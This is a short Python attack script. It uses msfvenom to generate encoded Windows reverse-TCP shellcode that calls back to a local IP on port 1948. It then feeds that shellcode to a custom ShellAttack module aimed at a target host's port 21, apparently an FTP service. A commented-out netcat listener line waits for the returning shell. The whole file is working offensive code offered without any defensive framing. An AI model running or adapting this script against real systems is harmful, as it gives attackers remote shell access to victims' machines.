import subprocess
import random
import ShellAttack
import socket
import ShellAccess
import runpy
import time
import sys
def generate_powershell_shellcode(payload, ipaddr, port):
    # grab the metasploit path
    cmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f py -b "\\x00\\x0a\\x0d\" -e x86/shikata_ga_nai'.format(payload,ipaddr ,port) 
   
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # print(data)
    # target = "192.168.18.14"
    port = 21
    #start to format this a bit to get it ready
    # data = data.replace(";", "")
    return  data 
    # data = data.replace(" ", "")
    # data = data.replace("+", "")
    # data = data.replace('b', "b")
    # data = data.replace("\n", "")
    # data = data.replace("buf=", "")

    # ShellAccess.shellacess(data,target_machine,port)
   
    # # data = data.rstrip()
    # print data
    # f = open('payload.txt', 'wb')
    # f.write(data)
    # f.close()
    # base counter
    # print data
   


payload = "windows/shell_reverse_tcp"
ipadd = "192.168.18.37"
port = 1948

shellcode_genrated = generate_powershell_shellcode(payload, ipadd, port)

target_machine = "192.168.18.14"
target_port = 21

ShellAttack.shell_attack(target_machine, target_port,shellcode_genrated)
 
# subprocess.call("nc -nvlp {0}".format(port), shell=True)


